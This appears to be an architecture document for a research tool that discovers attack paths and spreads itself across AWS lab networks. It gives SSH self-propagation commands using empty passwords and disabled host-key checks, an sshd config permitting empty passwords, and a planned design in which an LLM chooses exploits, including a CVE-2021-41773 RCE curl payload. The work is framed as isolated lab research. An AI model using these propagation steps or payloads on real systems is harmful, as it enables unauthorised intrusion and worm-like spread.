# System Architecture — Physarum Attack Paths

**Status:** Living document — updated as gates are completed  
**Last updated:** 2026-05-24  
**Author:** Dev Lead

---

## 1. Overview

`physarum-attack-paths` is a distributed system that discovers, scores, and autonomously traverses attack paths across heterogeneous computing environments. The design is modeled on the slime mold *Physarum polycephalum*: an organism with no central nervous system that nonetheless solves shortest-path problems by reinforcing productive routes and pruning dead ends.

The system has evolved through four architectural generations:

```
Generation 1   Server + Agent (Q_ij / q_ema / D_ij reinforcement model)
Generation 2   eBPF passive flow observation (tracepoint/sock/inet_sock_set_state)
Generation 3   Autonomous maze propagation (physarum-maze, PF-1, PF-2)
Generation 4   LLM-aware adaptive propagation (physarum-llm — planned, Issue #106)
```

Each generation builds on the scoring foundation established in Generation 1. The scoring formula does not change — the input signals and propagation mechanisms generalize.

---

## 2. Mathematical core

### Edge reinforcement signals

Each edge `(i, j)` carries three quantities updated continuously by the agents:

```
Q_ij     instantaneous probe quality (0..1) — success_rate, avg_rtt_ms
q_ema    exponential moving average of Q_ij over a sliding window (WINDOW_SIZE=20)
D_ij     conductivity — the persistent edge weight used by path selection
```

The EMA update is:

```
q_ema_new = α × Q_ij + (1 - α) × q_ema_prev     α = 1 / WINDOW_SIZE
```

### Path scoring (negative-log model, Gate K.1+)

The score for a path `p = [e1, e2, ..., ek]` is:

```
score(p) = exp( -(Σ -ln(max(q_ema_i, Q_EMA_FLOOR)) + HOP_WEIGHT × (k-1)) )
```

where:

```
Q_EMA_FLOOR  = 0.001   (prevents log(0))
HOP_WEIGHT   = 0.05    (calibrated: healthy 3-hop beats degraded 1-hop when q_ema < 0.91)
```

This is the scoring model from Gate K.1 onward. Earlier gates used a simpler product formula.

### Physarum-maze scoring (PF-1, PF-2)

Autonomous propagation uses a per-edge multiplier model:

```
Productive hop (new node)      × 1.5   (reinforcement)
Dead end (no further hops)     × 0.05  (rapid decay)
Already colonized (secondary)  × 0.8   (mild penalty — occupied, not failed)
Secondary conduit confirmed    × 1.2   (preserved, not discarded)
```

Edge scores persist in `physarum-lineage.json` under the `scores` map keyed by `"src_ip:dst_ip"`.

---

## 3. Crate layout

```
physarum-attack-paths/
├── crates/
│   ├── physarum-protocol          wire types: ProbeReport, FlowObservation, GraphEdge
│   ├── physarum-server            HTTP coordinator: /agents, /graph, /paths, /flow-observations
│   ├── physarum-agent             peer-probing agent: probes, EMA, report dispatch
│   ├── physarum-ebpf-observer     eBPF userspace sidecar (Aya); TCP state tracepoint
│   ├── physarum-ebpf-observer-ebpf  eBPF bytecode (no_std)
│   ├── physarum-packet-observer   raw-socket stimulus capture (ICMP + TCP SYN)
│   ├── physarum-packet-observer-ebpf  eBPF bytecode for packet observer
│   ├── physarum-scanner           async port scanner — full RustScan feature parity
│   ├── physarum-probe             probe execution library (shared by agent and maze)
│   ├── physarum-node              node runtime (role selection, stimulus dispatch)
│   ├── physarum-node-runtime      node runtime library
│   └── physarum-maze              PF-1/PF-2 self-propagating maze agent (single binary)
└── examples/
    ├── local-lab/                 A/B/C local process lab
    ├── docker-lab/                A/B/C/D Docker Compose lab
    ├── aws-lab/
    │   ├── terraform/             AWS Modes 1, 2, tc/netem, Gate K/K.1
    │   ├── terraform-pf1/         PF-1 organic expansion maze lab
    │   ├── terraform-pf2/         PF-2 adaptive re-routing lab
    │   ├── ansible/               Gate K/K.1 verification playbooks
    │   ├── ansible-pf1/           PF-1 verification playbooks
    │   └── ansible-pf2/           PF-2 verification playbooks
    └── formal/tla/                TLA+ edge dynamics model
```

---

## 4. Generation 1 — Server + Agent

### Topology

```
physarum-server     coordinator; holds the authoritative graph in memory
physarum-agent      peer-probing agent; probes targets, reports to coordinator
```

Each agent is given a list of probe targets at launch. It probes each target at a fixed interval, computes a probe report, and POSTs it to the coordinator. The coordinator updates `q_ema` and `D_ij` for each `(agent_id, target_id)` edge.

### Validated labs (Generation 1)

| Lab | Gate | Result |
|---|---|---|
| Local A/B/C (process) | Phase 1A–1C | PASS |
| Docker A/B/C | — | 15 passed |
| Docker A/B/C/D | — | 34 passed |
| TLA+ single edge model | — | TypeOK + Safety verified |
| B/C/D TLA+ Path-Selection | Gate F | TypeOK + Safety + PathSelectionSafety; 148,877 states |
| AWS Mode 1 (full mesh) | Gate C | failed=0 |
| AWS Mode 2 (segmented B→C→D) | Gate E | failed=0; `/paths` routes via C only |
| Docker weighted competing paths | Gate G | B→C→D↔B→E→D re-selection |
| AWS tc/netem weighted paths | Gate H | Phase 1 B→C→D; Phase 2 B→E→D; Δ~5–7% |

---

## 5. Generation 2 — eBPF passive flow observation

### Motivation

Active probing tells the coordinator what the agent *tried* to reach. Passive observation tells it what traffic is *actually flowing* — including connections the agent did not initiate.

### Architecture

```
physarum-ebpf-observer     userspace; Aya runtime; posts FlowObservation to coordinator
physarum-ebpf-observer-ebpf  kernel; tracepoint/sock/inet_sock_set_state; 5-tuple metadata only
```

The tracepoint fires on every TCP state change. The eBPF program extracts the 5-tuple (source IP/port, destination IP/port, protocol) and the state transition. It emits a ring-buffer event consumed by the userspace sidecar. The sidecar maps each event to a `FlowObservation` and posts it to the coordinator.

**Security constraint:** metadata only. No packet payload is captured. The eBPF program reads socket fields — it does not copy sk_buff data.

### FlowObservation wire type

```rust
struct FlowObservation {
    agent_id:        String,
    source_ip:       IpAddr,
    source_port:     u16,
    destination_ip:  IpAddr,
    destination_port: u16,
    protocol:        FlowProtocol,     // Tcp | Udp
    direction:       FlowDirection,    // Inbound | Outbound
    event:           FlowEvent,        // ConnectEstablished | ConnectClosed | ...
    pid:             u32,
    comm:            String,
}
```

### Validated labs (Generation 2)

| Lab | Gate | Result |
|---|---|---|
| FlowObservation model + POST/GET endpoints | Gate I | 64 tests pass |
| eBPF observer runtime (AWS EC2, kernel 6.18) | Gate J | tracepoint attached; FlowObs posted; failed=0 |
| eBPF observer agent-b→agent-c correlation | Gate J.1 | 5-tuple confirmed; q_ema≈1.0; failed=0 |
| Segmented adaptive flow-path (5-node) | Gate K | q_ema>0 on B→E, C→D, D→E; degradation/recovery PASS |
| Autonomous path selection (negative-log scoring) | Gate K.1 | Phase 1→2→3 path flip; selected_path correct; failed=0 |

---

## 6. Generation 3 — Autonomous maze propagation

### Motivation

Gates A–K.1 proved the reinforcement model under controlled topologies where each node was pre-provisioned with an agent binary. Generation 3 asks the harder question: **can the organism provision itself?** The answer is yes — if the target node allows SSH and the agent has credentials.

### physarum-maze binary

`physarum-maze` is a single self-contained binary that:

1. **Discovers** candidate hosts in the local /24 via `physarum-scanner` (RustScan-backed async TCP scan, optional ICMP/UDP).
2. **Stimulates** each candidate — raw TCP SYN socket, ICMP, and eBPF tracepoint events feed the same scoring loop.
3. **Propagates** to the highest-scored candidate by SCP-ing the binary over empty-password SSH, then launching it on the remote node via `systemd-run`.
4. **Records lineage** in `/tmp/physarum-lineage.json` — origin IP, propagation path, hop count, per-edge scores, visited IPs, secondary conduits.

### Stimulus sources

```
TCP SYN (raw socket)   physarum-packet-observer captures inbound SYN packets; source IP = discovery signal
ICMP echo reply        raw socket listener captures ICMP replies; source IP = live host signal
eBPF tracepoint        tracepoint/sock/inet_sock_set_state; confirms connection-level reachability
Nmap /24 scan          physarum-scanner enumerates all live hosts in the local subnet
```

All four stimulus types feed the same scoring map keyed by source IP. Stronger stimulus → higher score → organism propagates there next.

### Propagation mechanism

```
1. SCP physarum-maze binary to target:
   sshpass -p '' scp -o StrictHostKeyChecking=no physarum-maze ec2-user@<target>:/tmp/

2. Launch on target via systemd-run (daemonized, detached):
   sshpass -p '' ssh ec2-user@<target> \
     "systemd-run --unit=physarum-maze --no-ask-password /tmp/physarum-maze [flags]"

3. Target node repeats from step 1 with its own discovered neighbors.
```

Empty-password SSH is enforced by `sshd_config.d/99-maze.conf` on each maze host:

```
Match Address <allowed_src_ips>
    PasswordAuthentication yes
    PermitEmptyPasswords yes
    AllowUsers ec2-user
```

### Lineage JSON structure

```json
{
  "origin":            "10.60.10.10",
  "path":              ["10.60.10.10", "10.60.20.20", "10.60.30.20", "10.60.40.10"],
  "hops":              3,
  "visited":           ["10.60.10.10", "10.60.10.20", "10.60.20.10", ...],
  "scores":            {"10.60.10.10:10.60.20.20": 1.5, "10.60.30.20:10.60.40.10": 2.25},
  "colonized":         ["10.60.40.10"],
  "secondary_conduits": [["10.60.50.10", "10.60.40.10"]]
}
```

### PF-1 — Organic expansion maze

**Topology:** 7 EC2 instances across three subnets.

```
front subnet    (10.60.10.0/24)   A (seed)
layer-1 subnet  (10.60.20.0/24)   B, C
layer-2 subnet  (10.60.30.0/24)   D, E, F
layer-3 subnet  (10.60.40.0/24)   G (milestone)
```

**Propagation path validated:** A → C → E → F → G (55 seconds end-to-end)

**Key behaviors:**
- A propagates to whichever layer-1 node responds first (ICMP stimulus decides B vs C)
- Layer-2 nodes D/E/F compete; organism takes the highest-scored path to G
- Dead end D scores ×0.05, decays; organism routes around it
- G's lineage records the full multi-hop origin chain

### PF-2 — Adaptive re-routing

**Topology:** PF-1 + 2 additional nodes (9 total).

```
front subnet    (10.60.10.0/24)   A (seed), A.1 (lateral — appears T+5min)
cross subnet    (10.60.50.0/24)   X (cross-probe — appears T+5min)
```

**Three adaptive behaviors validated:**

```
1. Lateral discovery    A discovers A.1 via /24 nmap scan (physarum-scanner)
                        A.1 (10.60.10.20) appears in A's lineage.visited

2. Cross-subnet stimulus  X sends TCP SYN to A.1:22 every 30s (bash /dev/tcp built-in)
                          A.1's raw socket captures the SYN → A.1 discovers X → propagates

3. Secondary conduit    X finds G already colonized (physarum-maze binary + unit present)
                        X records [X_IP, G_IP] in secondary_conduits (score ×0.8 × 1.2)
                        G is NOT re-deployed — secondary conduit semantics preserved
```

**Terraform gate:** `time_sleep` resource delays A.1 and X creation by 5 minutes, simulating real-world corridor appearance during organism runtime.

---

## 7. Generation 4 — LLM-aware adaptive propagation (planned)

### The Causal Continuity Paradox of Origin and Destination

The autonomous propagation mechanism described in Generation 3 has a structural constraint:

> *If node A carries the agent and node B exists with SSH closed but port 80 open, the organism is confined. The agent observes B (eBPF sees port 80 traffic) but cannot propagate there — no propagation vector exists in its current repertoire.*

Formally:

```
lim_{propagation_vectors→∞} P(reach | B.ssh=closed, B.port_80=open) → 1
```

As long as the propagation vector set is fixed (SSH only), the reachability probability for B is zero regardless of how many times the organism probes. The paradox: origin (A with a running agent) and destination (B with an accessible port) are causally connected by a network path that the organism cannot traverse with its current capabilities.

The LLM oracle resolves this by treating the problem as a **context-aware propagation strategy query**:

```
Input:  DiscoveryQuery {
    target_ip:       "10.60.20.10",
    open_ports:      [80, 443],
    ssh_open:        false,
    banner:          "Apache/2.4.49",
    os_hint:         "Linux",
    current_node_ip: "10.60.10.10",
}

Output: PropagationStrategy {
    method:          Exploit { cve: "CVE-2021-41773", port: 80 },
    confidence:      0.92,
    bootstrap:       "curl http://10.60.20.10/cgi-bin/.%2e/%2e%2e/bin/sh -d 'echo Content-Type: text/plain; ...'",
    rationale:       "Apache 2.4.49 path traversal + mod_cgi RCE via port 80",
}
```

### `physarum-llm` crate (Issue #106)

```
crates/physarum-llm/
├── src/
│   ├── lib.rs             LlmClient trait definition
│   ├── types.rs           DiscoveryQuery, PropagationStrategy, PropagationMethod
│   └── openai.rs          OpenAiCompatibleClient (async-openai, configurable base_url)
└── Cargo.toml
```

**LLM-agnostic design:** the same `LlmClient` trait works with any OpenAI-compatible API:

```
Backend          base_url                       API key
OpenAI           https://api.openai.com/v1      required
Ollama (local)   http://localhost:11434/v1       none
Groq             https://api.groq.com/openai/v1  required
vLLM             http://<host>:8000/v1           optional
```

**Security constraints:**
- `--llm-api-key` is NEVER stored in `physarum-lineage.json`
- API key is injected locally via `$LLM_API_KEY` on each node by a bootstrap script
- Exploit-based propagation is lab-only — `terraform-vuln/` isolated environment
- Confidence threshold: LLM responses below 0.7 are rejected

### physarum-maze CLI flags (planned)

```
--llm-endpoint    http://localhost:11434/v1    OpenAI-compatible base URL
--llm-model       llama3.2                    model identifier
--llm-api-key     $LLM_API_KEY                injected at runtime, not stored
--llm-timeout-ms  10000                       per-request timeout
```

### Planned PoC lab — CVE-2021-41773

```
terraform-vuln/
├── host-vuln.sh.tpl    Apache 2.4.49 + mod_cgi, port 80 only, SSH closed
└── main.tf             isolated VPC; no SSH SG rule on vuln host
```

The organism reaches host-vuln via port 80 using the LLM-generated exploit, propagates the maze binary via the RCE, and records the path in lineage. Proof of concept that the paradox is resolved.

---

## 8. Gate progression summary

| Gate | Description | Status |
|---|---|---|
| A | S3 artifact delivery + EC2 bootstrap design | COMPLETED |
| B | S3 delivery + IAM role + user_data | COMPLETED |
| C | AWS Mode 1 full mesh runtime | COMPLETED |
| D | Phase identity (`lab_phase` variable) | COMPLETED |
| E | AWS Mode 2 segmented B→C→D | COMPLETED |
| F | B/C/D TLA+ Path-Selection Model | COMPLETED |
| G | Docker weighted competing paths | COMPLETED |
| H | AWS tc/netem weighted competing paths | COMPLETED |
| I | FlowObservation model + POST/GET endpoints | COMPLETED |
| J | eBPF observer runtime (AWS EC2) | COMPLETED |
| J.1 | eBPF observer agent flow correlation | COMPLETED |
| K | Segmented adaptive flow-path lab (5-node) | COMPLETED |
| K.1 | Autonomous path selection (negative-log scoring) | COMPLETED |
| L | physarum-scanner (RustScan feature parity + rlimit) | COMPLETED |
| L.2 | Local interface stimulus evidence | COMPLETED |
| L.3 | ICMP stimulus evidence | COMPLETED |
| M | physarum-maze node runtime (autonomous propagation) | COMPLETED |
| M.4 | Scoring adapter / edge weighting | COMPLETED |
| PF-1 | Organic expansion maze (7-node AWS lab) | COMPLETED |
| PF-2 | Adaptive re-routing (9-node AWS lab + TCP/ICMP adaptive behaviors) | COMPLETED |
| N | mTLS + Ed25519 lineage signatures | PLANNED |
| physarum-llm | LLM-aware adaptive propagation (Issue #106) | PLANNED |

---

## 9. Build and deployment

### Rule: all production builds via Docker Build Cloud

```bash
docker buildx build \
  --builder cloud-expertsonline-physarum-attack-paths \
  --platform linux/amd64 \
  --target physarum-maze \
  -t physarum-maze:latest \
  --output type=local,dest=./dist \
  .
```

Local `cargo build` is acceptable for development iteration. Any binary deployed to AWS must come from Docker Build Cloud.

### AWS lab lifecycle

```bash
# Deploy
terraform -chdir=examples/aws-lab/terraform-pf2 apply -auto-approve

# Verify (after ~15 minutes for full propagation)
ansible-playbook \
  -i examples/aws-lab/ansible-pf2/aws_ec2.yml \
  examples/aws-lab/ansible-pf2/verify-pf2-adaptation.yml

# Destroy
terraform -chdir=examples/aws-lab/terraform-pf2 destroy -auto-approve
```

All AWS resources are destroyed after each lab run. No persistent infrastructure.

---

## 10. Relationship between documents

| Document | Purpose |
|---|---|
| `README.md` (root) | High-level vision, status table, quick start |
| `General-Docs/ARCHITECTURE.md` (this file) | Full system architecture across all generations |
| `General-Docs/QUALITY_GATE.md` | Gate definitions, acceptance criteria, evidence links |
| `General-Docs/PROTOTYPE_ROADMAP.md` | Phased implementation plan and milestone history |
| `General-Docs/ROLE_FLUID_AGENT_ARCHITECTURE.md` | eBPF direction + role-fluid agent design intent |
| `General-Docs/EBPF_FLOW_OBSERVATION_DESIGN.md` | eBPF Stage 0 design (Aya stack, tracepoint, sidecar) |
| `General-Docs/INSIGHTS_AND_BRAINSTORM.md` | Exploratory ideas — not authoritative |
| `General-Docs/DOCUMENTATION_GUIDELINES.md` | Documentation ownership model and contribution rules |
| GitHub Issue #106 | physarum-llm architecture + Causal Continuity Paradox (formal spec) |
